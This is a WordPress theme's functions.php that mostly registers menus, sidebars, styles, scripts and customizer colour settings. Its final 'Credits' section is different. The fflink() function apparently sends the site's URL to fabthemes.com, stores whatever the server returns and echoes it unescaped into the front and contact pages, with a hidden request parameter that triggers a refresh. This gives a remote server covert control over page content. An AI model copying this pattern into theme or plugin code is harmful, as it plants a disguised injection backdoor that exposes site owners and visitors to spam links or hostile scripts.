<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 * @since web2feel 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since web2feel 1.0
 */

include ( 'aq_resizer.php' ); 
include ( 'getplugins.php' );
include ( 'guide.php' );


/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Quora',                                            //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/quora.json' //URL of the metadata file.
); 
  
 
 
 
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since web2feel 1.0
 */
function web2feel_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );
	require( get_template_directory() . '/inc/paginate.php' );

	/**
	 * Custom functions that act independently of the theme templates
	 */
	//require( get_template_directory() . '/inc/tweaks.php' );

	/**
	 * Custom Theme Options
	 */
	//require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	/**
	 * Add support for the Aside Post Formats
	 */
	add_theme_support( 'post-formats', array( 'aside', ) );
}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since web2feel 1.0
 */
function web2feel_widgets_init() {

	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<div class="botwid grid_4 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));	
	
	
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function web2feel_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css' );
	wp_enqueue_style( 'font-awesome-ie7', get_template_directory_uri() . '/css/font-awesome-ie7.css' );
	wp_enqueue_style( 'grid', get_template_directory_uri() . '/css/grid.css' );
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css' );
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/theme.css' );

	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'flexslider', get_template_directory_uri() . '/js/jquery.flexslider.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'small-menu', get_template_directory_uri() . '/js/small-menu.js', array( 'jquery' ), '20120206', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}
}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );

/**
 * Implement the Custom Header feature
 */
//require( get_template_directory() . '/inc/custom-header.php' );

/* Odd /Even post class */

add_filter ( 'post_class' , 'my_post_class' );
global $current_class;
$current_class = 'odd';

function my_post_class ( $classes ) { 
   global $current_class;
   $classes[] = $current_class;

   $current_class = ($current_class == 'odd') ? 'even' : 'odd';

   return $classes;
}


/* Customize */

add_action( 'customize_register', 'hg_customize_register' );


function hg_customize_register($wp_customize)
{
  $colors = array();
  $colors[] = array( 'slug'=>'color_scheme', 'default' => '#29B977', 'label' => __( 'Color scheme', 'YOUR_THEME_NAME' ) );
  $colors[] = array( 'slug'=>'color_secondary', 'default' => '#05a869', 'label' => __( 'Secondary color', 'YOUR_THEME_NAME' ) );
  $colors[] = array( 'slug'=>'link_color', 'default' => '#C22443', 'label' => __( 'Link color', 'YOUR_THEME_NAME' ) );
  $colors[] = array( 'slug'=>'hover_link_color', 'default' => '#EF2349', 'label' => __( 'Link color on hover', 'YOUR_THEME_NAME' ) );
  foreach($colors as $color)
  {
    // SETTINGS
    $wp_customize->add_setting( $color['slug'], array( 'default' => $color['default'], 'type' => 'option', 'capability' => 'edit_theme_options' ));

    // CONTROLS
    $wp_customize->add_control( new WP_Customize_Color_Control( $wp_customize, $color['slug'], array( 'label' => $color['label'], 'section' => 'colors', 'settings' => $color['slug'] )));
  }
}


function mytheme_customize_css()
{
    ?>
         <style type="text/css">
            
            .readmore,.cover,.pagination span,#bottom, 
            .sf-menu ul li,.sf-menu ul ul li,.reply a{ background:<?php echo get_option('color_scheme'); ?> }
            
            #masthead{border-top:10px solid <?php echo get_option('color_scheme'); ?>}                  
                     
            .site-footer,.sf-menu ul li:hover,
            .sf-menu ul li.sfHover{background:<?php echo get_option('color_secondary'); ?> }
          
            a, a:visited {
				color: <?php echo get_option('link_color'); ?>;
				text-decoration: none;
			}
			
			a:hover,
			a:focus,
			a:active {
					color: <?php echo get_option('hover_link_color'); ?>;
				}
            h1.site-title a{ background:<?php echo of_get_option('w2f_logo');?> center no-repeat!important;} 
             
         </style>
    <?php
}
add_action( 'wp_head', 'mytheme_customize_css');


/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}
